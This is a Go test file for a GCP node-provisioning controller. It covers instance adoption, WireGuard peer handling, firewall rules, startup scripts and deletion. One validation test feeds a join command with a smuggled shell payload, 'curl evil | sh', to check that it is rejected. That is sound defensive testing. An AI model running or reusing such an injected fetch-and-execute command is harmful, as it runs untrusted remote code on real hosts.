package gcp

import (
	"context"
	"errors"
	"strings"
	"testing"

	"cloud.google.com/go/compute/apiv1/computepb"

	mlv1alpha1 "dcn.ssu.ac.kr/infra/api/ml/v1alpha1"
)

// ── ProvisionInstance against a fake GCE and a fake VPN server ───────────────

func TestProvisionInstance_ExistingOwnedInstanceIsAdoptedWithoutAllocatingAPeer(t *testing.T) {
	e := newProvEnv(t)
	e.gce.put("us-central1-a", ownedInstance(e.np, "RUNNING"))

	res, err := e.provision(t)
	if err != nil {
		t.Fatal(err)
	}
	if res == nil || res.InstanceID != "worker-1" || !res.Adopted {
		t.Fatalf("result = %+v, want the existing instance adopted", res)
	}
	if res.VpnIP != "" || res.PublicKey != "" {
		t.Errorf("an adopted instance must not carry a new VPN identity: %+v", res)
	}
	if len(e.gce.inserted) != 0 || len(e.gce.insertedFW) != 0 {
		t.Error("nothing may be created when an instance exists")
	}
	if e.Log("wg.calls") != "" || e.confText() != wgConfBase {
		t.Errorf("no VPN peer may be allocated/registered when adopting (wg calls %q, conf:\n%s)", e.Log("wg.calls"), e.confText())
	}
}

func TestProvisionInstance_ForeignInstanceWithTheSameNameIsNeverAdopted(t *testing.T) {
	e := newProvEnv(t)
	foreign := ownedInstance(e.np, "RUNNING")
	foreign.Labels = map[string]string{LabelUID: "somebody-elses-uid"}
	e.gce.put("us-central1-a", foreign)

	res, err := e.provision(t)
	if !errors.Is(err, ErrInstanceNameTaken) || res != nil {
		t.Fatalf("res=%+v err=%v, want ErrInstanceNameTaken and no result", res, err)
	}
	if len(e.gce.inserted) != 0 || e.Log("wg.calls") != "" {
		t.Error("a name clash must not launch or register anything")
	}
	// unlabelled lookalike (created by hand) is foreign too
	e = newProvEnv(t)
	hand := ownedInstance(e.np, "RUNNING")
	hand.Labels = nil
	e.gce.put("us-central1-a", hand)
	if _, err := e.provision(t); !errors.Is(err, ErrInstanceNameTaken) {
		t.Errorf("unlabelled instance of the same name: err=%v", err)
	}
}

func TestProvisionInstance_VPNLaunchRegistersPeerAndUsesAttemptRequestID(t *testing.T) {
	e := newProvEnv(t)
	e.np.Status.ProvisionRetryCount = 2
	res, err := e.provision(t)
	if err != nil {
		t.Fatal(err)
	}
	if res.InstanceID != "worker-1" || res.Adopted || res.VpnIP == "" || res.PublicKey == "" {
		t.Fatalf("result = %+v", res)
	}
	if len(e.gce.inserted) != 1 {
		t.Fatalf("inserts = %d", len(e.gce.inserted))
	}
	if got := e.gce.insertRequestID[0]; got != RequestIDForAttempt(testUID, 2) {
		t.Errorf("requestId = %q", got)
	}
	if !strings.Contains(e.confText(), res.PublicKey) {
		t.Errorf("peer not persisted on the VPN server:\n%s", e.confText())
	}
	inst := e.gce.inserted[0]
	script, ok := metaValue(inst, "startup-script")
	if !ok {
		t.Fatal("no startup-script metadata")
	}
	for _, want := range []string{"wg-quick@wg0", res.VpnIP, "kubeadm join"} {
		if !strings.Contains(script, want) {
			t.Errorf("startup script missing %q", want)
		}
	}
	if strings.Contains(script, "computeMetadata") {
		t.Error("VPN mode takes the node IP from the tunnel, not the metadata server")
	}
	// Firewall: only the WireGuard rule, only from the VPN server.
	if len(e.gce.insertedFW) != 1 || e.gce.insertedFW[0].GetName() != FirewallName("worker-1", "wg") ||
		e.gce.insertedFW[0].GetSourceRanges()[0] != "203.0.113.9/32" {
		t.Errorf("firewall rules: %v", e.gce.insertedFW)
	}
	if inst.GetLabels()[LabelUID] != testUID {
		t.Errorf("the instance must carry the UID label for adoption: %v", inst.GetLabels())
	}
}

func TestProvisionInstance_NoVPNNeverTouchesTheVPNServer(t *testing.T) {
	e := newProvEnv(t)
	e.np.Spec.DisableVPN = true
	// A nil VPN client and an unreachable-looking NetConfig prove nothing is dialled.
	e.nc.Spec.VPNRange = nil
	e.nc.Spec.VPNServerPublicConfig.PublicIP = ""
	res, err := ProvisionInstance(context.Background(), e.np, testCreds(), e.pubKey, nil, e.nc, pkgruntimeConfig())
	if err != nil {
		t.Fatal(err)
	}
	if res.InstanceID != "worker-1" || res.VpnIP != "" || res.PublicKey != "" {
		t.Fatalf("result = %+v", res)
	}
	if e.Log("wg.calls") != "" || e.confText() != wgConfBase {
		t.Error("no VPN peer may be registered without a VPN")
	}
	script, _ := metaValue(e.gce.inserted[0], "startup-script")
	for _, unwanted := range []string{"wg-quick", "/etc/wireguard", " wireguard "} {
		if strings.Contains(script, unwanted) {
			t.Errorf("VPN-less startup script contains %q", unwanted)
		}
	}
	if !strings.Contains(script, "computeMetadata/v1") || !strings.Contains(script, "/instance/network-interfaces/0/ip") {
		t.Error("the node IP must come from the GCE metadata server")
	}
	if len(e.gce.insertedFW) != 1 || e.gce.insertedFW[0].GetName() != FirewallName("worker-1", "mgmt") {
		t.Fatalf("expected the single management rule, got %v", e.gce.insertedFW)
	}
	for _, a := range e.gce.insertedFW[0].GetAllowed() {
		if a.GetIPProtocol() == "udp" && len(a.GetPorts()) == 1 && a.GetPorts()[0] == "51820" {
			t.Error("no WireGuard rule without a VPN")
		}
	}
}

func TestProvisionInstance_InstanceMetadataSSHKeyAndOSLogin(t *testing.T) {
	e := newProvEnv(t)
	e.np.Spec.DisableVPN = true
	e.np.Spec.SSHUsernameOverride = "ops"
	if _, err := ProvisionInstance(context.Background(), e.np, testCreds(), e.pubKey, nil, e.nc, pkgruntimeConfig()); err != nil {
		t.Fatal(err)
	}
	inst := e.gce.inserted[0]
	keys, ok := metaValue(inst, "ssh-keys")
	if !ok || !strings.HasPrefix(keys, "ops:ssh-rsa ") {
		t.Errorf("ssh-keys = %q (the controller logs in as spec.sshUsernameOverride)", keys)
	}
	if v, _ := metaValue(inst, "enable-oslogin"); v != "FALSE" {
		t.Errorf("OS Login must be off so the ssh-keys metadata is honoured, got %q", v)
	}
}

// A 409 on insert: an instance appeared between our lookup and the insert.
func TestProvisionInstance_InsertConflictReleasesPeerAndAsksForAdoption(t *testing.T) {
	e := newProvEnv(t)
	e.gce.insertInstanceErr = gerr(409, "alreadyExists", "The resource 'projects/p/zones/z/instances/worker-1' already exists")

	res, err := e.provision(t)
	if !errors.Is(err, ErrInstanceAlreadyLaunched) {
		t.Fatalf("err = %v, want ErrInstanceAlreadyLaunched", err)
	}
	if res == nil {
		t.Fatal("the result must be non-nil (nil-safe for callers)")
	}
	if res.VpnIP != "" || res.PublicKey != "" || res.InstanceID != "" || res.Adopted {
		t.Errorf("result must be empty, the peer was released: %+v", res)
	}
	calls := e.Log("wg.calls")
	if !strings.Contains(calls, "allowed-ips") || !strings.Contains(calls, " remove") {
		t.Errorf("the peer registered for the rejected attempt must be removed from the live interface: %q", calls)
	}
	if strings.Contains(e.confText(), "PublicKey") {
		t.Errorf("the peer must be removed from wg0.conf too:\n%s", e.confText())
	}
}

func TestProvisionInstance_LaunchErrorsKeepThePeerForTheCallerAndAreClassified(t *testing.T) {
	for name, tc := range map[string]struct {
		err  error
		want func(error) bool
		text string
	}{
		"quota":      {gerr(403, "quotaExceeded", "Quota 'CPUS' exceeded. Limit: 24.0"), IsQuotaExceeded, "quota"},
		"stockout":   {gerr(503, "ZONE_RESOURCE_POOL_EXHAUSTED", "ZONE_RESOURCE_POOL_EXHAUSTED: does not have enough resources"), IsStockout, "another zone"},
		"permission": {gerr(403, "forbidden", "Required 'compute.instances.create' permission"), IsPermissionDenied, "roles/compute.instanceAdmin.v1"},
		"auth":       {gerr(401, "authError", "Invalid Credentials"), IsAuthFailure, "credentials"},
	} {
		e := newProvEnv(t)
		e.gce.insertInstanceErr = tc.err
		res, err := e.provision(t)
		if err == nil || errors.Is(err, ErrInstanceAlreadyLaunched) {
			t.Fatalf("%s: err = %v", name, err)
		}
		if !tc.want(err) {
			t.Errorf("%s: the error class must survive wrapping: %v", name, err)
		}
		if !strings.Contains(err.Error(), tc.text) {
			t.Errorf("%s: message lacks advice %q: %v", name, tc.text, err)
		}
		if res == nil || res.VpnIP == "" || res.PublicKey == "" || res.InstanceID != "" {
			t.Fatalf("%s: the caller needs the peer identity to release it later (and no instance id): %+v", name, res)
		}
		if !strings.Contains(e.confText(), res.PublicKey) {
			t.Errorf("%s: peer must stay registered for the caller to record", name)
		}
	}
}

func TestProvisionInstance_LookupFailureAllocatesNothing(t *testing.T) {
	e := newProvEnv(t)
	e.gce.getInstanceErr = gerr(503, "backendError", "unavailable")
	res, err := e.provision(t)
	if err == nil || res != nil {
		t.Fatalf("res=%+v err=%v", res, err)
	}
	if !IsTransient(err) {
		t.Errorf("a throttled lookup is transient: %v", err)
	}
	if e.Log("wg.calls") != "" || len(e.gce.inserted) != 0 || len(e.gce.insertedFW) != 0 {
		t.Error("nothing may be allocated or launched when the existing-instance check fails")
	}
}

func TestProvisionInstance_InvalidInputHasNoSideEffects(t *testing.T) {
	cases := map[string]func(e *provEnv){
		"shell metacharacters in the join command": func(e *provEnv) {
			e.nc.Status.ClusterJoinCommand = "kubeadm join 10.8.0.1:6443; curl evil | sh"
		},
		"unresolved zone":        func(e *provEnv) { e.np.Spec.GCPConfig.Zone = "" },
		"bad kubernetes version": func(e *provEnv) { e.nc.Spec.SoftwareConfig.KubernetesVersion = "1" },
		"bad ssh key":            func(e *provEnv) { e.pubKey = []byte("garbage") },
		"vpn server a hostname":  func(e *provEnv) { e.nc.Spec.VPNServerPublicConfig.PublicIP = "vpn.example.com" },
		"missing vpn range":      func(e *provEnv) { e.nc.Spec.VPNRange = nil },
	}
	for name, mut := range cases {
		e := newProvEnv(t)
		mut(e)
		if _, err := e.provision(t); err == nil {
			t.Errorf("%s: expected a validation error", name)
		}
		if e.gce.getInstanceN != 0 || len(e.gce.insertedFW) != 0 || len(e.gce.inserted) != 0 || e.Log("wg.calls") != "" {
			t.Errorf("%s: validation must fail before any GCP or VPN call", name)
		}
	}
	// VPN mode without a VPN client
	e := newProvEnv(t)
	if _, err := ProvisionInstance(context.Background(), e.np, testCreds(), e.pubKey, nil, e.nc, pkgruntimeConfig()); err == nil {
		t.Error("VPN mode needs the VPN server connection")
	}
}

func TestProvisionInstance_FirewallPermissionDeniedIsAWarningNotAFailure(t *testing.T) {
	e := newProvEnv(t)
	e.gce.getFirewallErr = gerr(403, "forbidden", "Required 'compute.firewalls.get' permission")
	res, err := e.provision(t)
	if err != nil || res.InstanceID != "worker-1" {
		t.Fatalf("firewall rules may be managed centrally; res=%+v err=%v", res, err)
	}
}

func TestProvisionInstance_FirewallFailureStopsBeforeAnyPeerIsAllocated(t *testing.T) {
	e := newProvEnv(t)
	e.gce.getFirewallErr = gerr(400, "invalid", "network not found")
	res, err := e.provision(t)
	if err == nil || res != nil {
		t.Fatalf("res=%+v err=%v", res, err)
	}
	if e.Log("wg.calls") != "" || len(e.gce.inserted) != 0 {
		t.Error("a non-permission firewall failure must not leak a peer or an instance")
	}
}

// ── buildInstance ────────────────────────────────────────────────────────────

func builtInstance(t *testing.T, mut func(np *mlv1alpha1.NodeProvision)) *computepb.Instance {
	t.Helper()
	np := testNP()
	if mut != nil {
		mut(np)
	}
	inst, err := buildInstance(np, "proj-1", InstanceName(np), "echo script", "ubuntu:ssh-rsa AAA ubuntu")
	if err != nil {
		t.Fatal(err)
	}
	return inst
}

func TestBuildInstance_Defaults(t *testing.T) {
	inst := builtInstance(t, nil)
	if inst.GetName() != "worker-1" || inst.GetMachineType() != "zones/us-central1-a/machineTypes/e2-standard-4" {
		t.Errorf("name/machine type: %q %q", inst.GetName(), inst.GetMachineType())
	}
	d := inst.GetDisks()[0]
	if !d.GetBoot() || !d.GetAutoDelete() || d.GetInitializeParams().GetDiskSizeGb() != 50 ||
		d.GetInitializeParams().GetDiskType() != "zones/us-central1-a/diskTypes/pd-balanced" ||
		!strings.Contains(d.GetInitializeParams().GetSourceImage(), "ubuntu-2204") {
		t.Errorf("boot disk: %v", d)
	}
	nic := inst.GetNetworkInterfaces()[0]
	if nic.GetNetwork() != "projects/proj-1/global/networks/default" || nic.GetSubnetwork() != "" {
		t.Errorf("nic: %v", nic)
	}
	if len(nic.GetAccessConfigs()) != 1 || nic.GetAccessConfigs()[0].GetType() != "ONE_TO_ONE_NAT" {
		t.Error("an ephemeral external IP is attached by default")
	}
	if inst.GetScheduling() != nil || len(inst.GetGuestAccelerators()) != 0 || len(inst.GetServiceAccounts()) != 0 {
		t.Error("a plain CPU node needs no scheduling override, accelerators or service account")
	}
	if tags := inst.GetTags().GetItems(); len(tags) != 1 || tags[0] != NodeTag("worker-1") {
		t.Errorf("tags: %v", tags)
	}
	if v, _ := metaValue(inst, "startup-script"); v != "echo script" {
		t.Error("startup-script metadata")
	}
	if inst.GetLabels()[LabelManagedBy] != ManagedByValue || d.GetInitializeParams().GetLabels()[LabelUID] != testUID {
		t.Error("controller labels must be on the instance and its boot disk")
	}
}

func TestBuildInstance_Overrides(t *testing.T) {
	inst := builtInstance(t, func(np *mlv1alpha1.NodeProvision) {
		c := np.Spec.GCPConfig
		c.BootDiskSizeGB, c.BootDiskType = 200, "pd-ssd"
		c.Network, c.Subnetwork = "projects/host/global/networks/shared", "sub-1"
		c.DisableExternalIP = true
		c.NetworkTags = []string{"web", NodeTag("worker-1"), "web"}
		c.Labels = map[string]string{"team": "ml"}
		c.ServiceAccountEmail = "sa@proj-1.iam.gserviceaccount.com"
	})
	d := inst.GetDisks()[0].GetInitializeParams()
	if d.GetDiskSizeGb() != 200 || d.GetDiskType() != "zones/us-central1-a/diskTypes/pd-ssd" {
		t.Errorf("disk: %v", d)
	}
	nic := inst.GetNetworkInterfaces()[0]
	if nic.GetNetwork() != "projects/host/global/networks/shared" ||
		nic.GetSubnetwork() != "projects/host/regions/us-central1/subnetworks/sub-1" {
		t.Errorf("shared-VPC nic: %v / %v", nic.GetNetwork(), nic.GetSubnetwork())
	}
	if len(nic.GetAccessConfigs()) != 0 {
		t.Error("disableExternalIP must create the instance without an external address")
	}
	if got := inst.GetTags().GetItems(); len(got) != 2 || got[0] != NodeTag("worker-1") || got[1] != "web" {
		t.Errorf("tags must start with the node tag and be de-duplicated: %v", got)
	}
	if inst.GetLabels()["team"] != "ml" {
		t.Error("user labels")
	}
	sa := inst.GetServiceAccounts()
	if len(sa) != 1 || sa[0].GetEmail() != "sa@proj-1.iam.gserviceaccount.com" ||
		len(sa[0].GetScopes()) != 1 || !strings.HasSuffix(sa[0].GetScopes()[0], "cloud-platform") {
		t.Errorf("service account defaults to cloud-platform scope: %v", sa)
	}
	// An explicit subnetwork URL is passed through.
	inst = builtInstance(t, func(np *mlv1alpha1.NodeProvision) {
		np.Spec.GCPConfig.Subnetwork = "https://www.googleapis.com/compute/v1/projects/p/regions/europe-west1/subnetworks/s"
	})
	if got := inst.GetNetworkInterfaces()[0].GetSubnetwork(); got != "projects/p/regions/europe-west1/subnetworks/s" {
		t.Errorf("subnetwork URL: %q", got)
	}
	// The short regions/<r>/subnetworks/<n> form is qualified with the network's project.
	inst = builtInstance(t, func(np *mlv1alpha1.NodeProvision) {
		np.Spec.GCPConfig.Network = "projects/host/global/networks/shared"
		np.Spec.GCPConfig.Subnetwork = "regions/us-central1/subnetworks/s"
	})
	if got := inst.GetNetworkInterfaces()[0].GetSubnetwork(); got != "projects/host/regions/us-central1/subnetworks/s" {
		t.Errorf("short subnetwork path: %q", got)
	}
}

func TestBuildInstance_GPUShapes(t *testing.T) {
	// N1 + explicit accelerator
	inst := builtInstance(t, func(np *mlv1alpha1.NodeProvision) {
		np.Spec.InstanceType = "n1-standard-8"
		np.Spec.GCPConfig.Accelerator = &mlv1alpha1.GCPAccelerator{Type: "nvidia-tesla-t4", Count: 2}
	})
	ga := inst.GetGuestAccelerators()
	if len(ga) != 1 || ga[0].GetAcceleratorCount() != 2 || ga[0].GetAcceleratorType() != "zones/us-central1-a/acceleratorTypes/nvidia-tesla-t4" {
		t.Errorf("guest accelerators: %v", ga)
	}
	if s := inst.GetScheduling(); s == nil || s.GetOnHostMaintenance() != "TERMINATE" || !s.GetAutomaticRestart() {
		t.Errorf("GPU instances cannot live-migrate: %v", s)
	}
	// G2 / A2: GPUs implied, no accelerators declared, still TERMINATE
	for _, mt := range []string{"g2-standard-8", "a2-highgpu-1g"} {
		inst = builtInstance(t, func(np *mlv1alpha1.NodeProvision) { np.Spec.InstanceType = mt })
		if len(inst.GetGuestAccelerators()) != 0 {
			t.Errorf("%s: accelerators are attached by the machine type itself", mt)
		}
		if inst.GetScheduling().GetOnHostMaintenance() != "TERMINATE" {
			t.Errorf("%s must use onHostMaintenance=TERMINATE", mt)
		}
	}
}

func TestBuildInstance_SpotScheduling(t *testing.T) {
	inst := builtInstance(t, func(np *mlv1alpha1.NodeProvision) { np.Spec.GCPConfig.Spot = true })
	s := inst.GetScheduling()
	if s.GetProvisioningModel() != "SPOT" || s.GetAutomaticRestart() || s.GetOnHostMaintenance() != "TERMINATE" ||
		s.GetInstanceTerminationAction() != "DELETE" {
		t.Errorf("spot scheduling: %v", s)
	}
	// Spot + GPU stays spot (and TERMINATE)
	inst = builtInstance(t, func(np *mlv1alpha1.NodeProvision) {
		np.Spec.InstanceType = "g2-standard-8"
		np.Spec.GCPConfig.Spot = true
	})
	if inst.GetScheduling().GetProvisioningModel() != "SPOT" {
		t.Error("spot GPU")
	}
}

func TestBuildInstance_RequiresResolvedConfig(t *testing.T) {
	np := testNP()
	np.Spec.GCPConfig.SourceImage = ""
	if _, err := buildInstance(np, "p", "worker-1", "", ""); err == nil {
		t.Error("an unresolved image must not reach the API")
	}
	np = testNP()
	np.Spec.GCPConfig = nil
	if _, err := buildInstance(np, "p", "worker-1", "", ""); err == nil {
		t.Error("nil gcpConfig")
	}
	np = testNP()
	np.Spec.GCPConfig.Zone = "nonsense"
	if _, err := buildInstance(np, "p", "worker-1", "", ""); err == nil {
		t.Error("bad zone")
	}
}

// ── WaitForInstanceRunning: the instance state machine ───────────────────────

func waitFor(t *testing.T, f *fakeCompute) (string, string, error) {
	t.Helper()
	useFake(t, f)
	return WaitForInstanceRunning(context.Background(), testNP(), testCreds(), "worker-1")
}

func TestWaitForInstanceRunning_States(t *testing.T) {
	np := testNP()
	for _, status := range []string{"PROVISIONING", "STAGING", "REPAIRING", ""} {
		f := newFakeCompute()
		f.put("us-central1-a", ownedInstance(np, status))
		in, ex, err := waitFor(t, f)
		if err != nil || in != "" || ex != "" {
			t.Errorf("%q: still launching, caller must requeue; got %q %q %v", status, in, ex, err)
		}
	}
	for _, status := range []string{"TERMINATED", "STOPPED", "STOPPING", "SUSPENDING", "SUSPENDED", "DEPROVISIONING"} {
		f := newFakeCompute()
		f.put("us-central1-a", ownedInstance(np, status))
		_, _, err := waitFor(t, f)
		if err == nil || !strings.Contains(err.Error(), "terminal state") || !strings.Contains(err.Error(), status) {
			t.Errorf("%s never becomes RUNNING again: want a hard error, got %v", status, err)
		}
		if IsTransient(err) {
			t.Errorf("%s: a terminal state must not be classified as transient", status)
		}
	}

	f := newFakeCompute()
	f.put("us-central1-a", ownedInstance(np, "RUNNING"))
	in, ex, err := waitFor(t, f)
	if err != nil || in != "10.128.0.7" || ex != "34.1.2.3" {
		t.Errorf("RUNNING: %q %q %v", in, ex, err)
	}
}

func TestWaitForInstanceRunning_RunningWithoutExternalIPOrNIC(t *testing.T) {
	np := testNP()
	f := newFakeCompute()
	inst := ownedInstance(np, "RUNNING")
	inst.NetworkInterfaces[0].AccessConfigs = nil
	f.put("us-central1-a", inst)
	in, ex, err := waitFor(t, f)
	if err != nil || in != "10.128.0.7" || ex != "" {
		t.Errorf("internal-only instance: %q %q %v", in, ex, err)
	}
	f = newFakeCompute()
	inst = ownedInstance(np, "RUNNING")
	inst.NetworkInterfaces = nil
	f.put("us-central1-a", inst)
	if in, _, err := waitFor(t, f); err != nil || in != "" {
		t.Errorf("a NIC that is not populated yet means requeue, got %q %v", in, err)
	}
}

func TestWaitForInstanceRunning_VanishedAndAPIErrors(t *testing.T) {
	f := newFakeCompute() // no instance at all: deleted or preempted (spot + DELETE)
	_, _, err := waitFor(t, f)
	if err == nil || !strings.Contains(err.Error(), "not found") {
		t.Errorf("a vanished instance is a hard error, got %v", err)
	}
	f = newFakeCompute()
	f.getInstanceErr = gerr(503, "backendError", "unavailable")
	if _, _, err := waitFor(t, f); err == nil || !IsTransient(err) {
		t.Errorf("a throttled API stays classifiable so the caller can retry: %v", err)
	}
	f = newFakeCompute()
	f.getInstanceErr = gerr(403, "forbidden", "Required 'compute.instances.get' permission")
	if _, _, err := waitFor(t, f); err == nil || !IsPermissionDenied(err) {
		t.Errorf("permission errors stay classifiable: %v", err)
	}
	np := testNP()
	np.Spec.GCPConfig.Zone = ""
	if _, _, err := WaitForInstanceRunning(context.Background(), np, testCreds(), "worker-1"); err == nil {
		t.Error("an unresolved zone must be an error")
	}
}

// ── FindInstance ─────────────────────────────────────────────────────────────

func TestFindInstance(t *testing.T) {
	np := testNP()
	ctx := context.Background()

	f := newFakeCompute()
	useFake(t, f)
	if id, err := FindInstance(ctx, np, testCreds()); err != nil || id != "" {
		t.Errorf("nothing launched: %q %v", id, err)
	}
	f.put("us-central1-a", ownedInstance(np, "TERMINATED"))
	if id, err := FindInstance(ctx, np, testCreds()); err != nil || id != "worker-1" {
		t.Errorf("an owned instance is found whatever its state (the wait step judges it): %q %v", id, err)
	}
	foreign := ownedInstance(np, "RUNNING")
	foreign.Labels = map[string]string{LabelUID: "other"}
	f.put("us-central1-a", foreign)
	if id, err := FindInstance(ctx, np, testCreds()); err != nil || id != "" {
		t.Errorf("someone else's instance must be reported absent: %q %v", id, err)
	}
	f.getInstanceErr = gerr(503, "backendError", "x")
	if _, err := FindInstance(ctx, np, testCreds()); err == nil {
		t.Error("lookup errors must surface")
	}
	// zone never resolved: nothing can exist, and no API call is made
	f = newFakeCompute()
	useFake(t, f)
	unresolved := testNP()
	unresolved.Spec.GCPConfig.Zone = ""
	if id, err := FindInstance(ctx, unresolved, testCreds()); err != nil || id != "" || f.getInstanceN != 0 {
		t.Errorf("unresolved zone: %q %v calls=%d", id, err, f.getInstanceN)
	}
}

// ── DeleteInstance ───────────────────────────────────────────────────────────

func TestDeleteInstance_DeletesInstanceAndNodeFirewallsIdempotently(t *testing.T) {
	ctx := context.Background()
	np := testNP()
	f := newFakeCompute()
	useFake(t, f)
	f.put("us-central1-a", ownedInstance(np, "RUNNING"))
	if err := ensureFirewalls(ctx, f, plan(false)); err != nil {
		t.Fatal(err)
	}

	if err := DeleteInstance(ctx, np, testCreds(), "worker-1"); err != nil {
		t.Fatal(err)
	}
	if len(f.instances) != 0 {
		t.Error("the instance must be deleted")
	}
	if len(f.firewalls) != 0 {
		t.Errorf("the node's firewall rules must be deleted, left %v", f.firewalls)
	}
	// Second call: everything is already gone -> success (NotFound == success).
	before := len(f.deletedInst)
	if err := DeleteInstance(ctx, np, testCreds(), "worker-1"); err != nil {
		t.Fatalf("deletion must be idempotent: %v", err)
	}
	if len(f.deletedInst) != before {
		t.Error("an instance that is already gone must not be deleted again")
	}
}

func TestDeleteInstance_NotFoundRaceIsSuccess(t *testing.T) {
	// The instance disappears between our lookup and the delete call.
	np := testNP()
	f := newFakeCompute()
	useFake(t, f)
	f.put("us-central1-a", ownedInstance(np, "RUNNING"))
	f.deleteInstanceErr = gerr(404, "notFound", "gone")
	if err := DeleteInstance(context.Background(), np, testCreds(), "worker-1"); err != nil {
		t.Errorf("404 on delete is success: %v", err)
	}
}

func TestDeleteInstance_ErrorsAreReportedForRetry(t *testing.T) {
	np := testNP()
	f := newFakeCompute()
	useFake(t, f)
	f.put("us-central1-a", ownedInstance(np, "RUNNING"))
	f.deleteInstanceErr = gerr(403, "forbidden", "Required 'compute.instances.delete' permission")
	err := DeleteInstance(context.Background(), np, testCreds(), "worker-1")
	if err == nil || !IsPermissionDenied(err) {
		t.Errorf("a failed delete must be returned (the finalizer stays), got %v", err)
	}
	if _, ok := f.instances["us-central1-a/worker-1"]; !ok {
		t.Error("the instance is still there")
	}
	f.deleteInstanceErr = nil
	f.getInstanceErr = gerr(503, "backendError", "x")
	if err := DeleteInstance(context.Background(), np, testCreds(), "worker-1"); err == nil {
		t.Error("a failed lookup must be returned, not treated as 'gone'")
	}
}

func TestDeleteInstance_NeverDeletesAForeignInstance(t *testing.T) {
	np := testNP()
	f := newFakeCompute()
	useFake(t, f)
	foreign := ownedInstance(np, "RUNNING")
	foreign.Labels = map[string]string{LabelUID: "someone-else"}
	f.put("us-central1-a", foreign)
	if err := DeleteInstance(context.Background(), np, testCreds(), "worker-1"); err != nil {
		t.Fatal(err)
	}
	if len(f.deletedInst) != 0 {
		t.Error("an instance labelled for another NodeProvision must never be deleted")
	}
}

func TestDeleteInstance_NoInstanceIDStillRemovesFirewalls(t *testing.T) {
	ctx := context.Background()
	np := testNP()
	f := newFakeCompute()
	useFake(t, f)
	if err := ensureFirewalls(ctx, f, plan(true)); err != nil { // a launch that failed after the firewall step
		t.Fatal(err)
	}
	if err := DeleteInstance(ctx, np, testCreds(), ""); err != nil {
		t.Fatal(err)
	}
	if len(f.firewalls) != 0 || len(f.deletedInst) != 0 {
		t.Errorf("only the firewall rules go: firewalls=%v deletedInstances=%v", f.firewalls, f.deletedInst)
	}
}

func TestDeleteInstance_UnresolvedLocationIsANoOp(t *testing.T) {
	f := newFakeCompute()
	useFake(t, f)
	np := testNP()
	np.Spec.GCPConfig.Zone = ""
	if err := DeleteInstance(context.Background(), np, testCreds(), "worker-1"); err != nil {
		t.Fatal(err)
	}
	np = testNP()
	np.Spec.GCPConfig = nil
	if err := DeleteInstance(context.Background(), np, testCreds(), ""); err != nil {
		t.Fatal(err)
	}
	if len(f.projects) != 0 {
		t.Error("no API call may be made when nothing could have been created")
	}
}

func TestProjectOfPrefersTheSpecThenTheKey(t *testing.T) {
	np := testNP()
	if projectOf(np, Credentials{ProjectID: "from-key"}) != "proj-1" {
		t.Error("spec project wins")
	}
	np.Spec.GCPConfig.ProjectID = ""
	if projectOf(np, Credentials{ProjectID: "from-key"}) != "from-key" {
		t.Error("fall back to the key's project")
	}
	np.Spec.GCPConfig = nil
	if projectOf(np, Credentials{ProjectID: "from-key"}) != "from-key" {
		t.Error("nil config falls back too")
	}
}

func TestParsePort(t *testing.T) {
	for in, want := range map[string]int{"": 51820, "51821": 51821, " 443 ": 443, "x": 51820, "0": 51820, "-5": 51820, "70000": 51820} {
		if got := parsePort(in, 51820); got != want {
			t.Errorf("parsePort(%q) = %d, want %d", in, got, want)
		}
	}
}
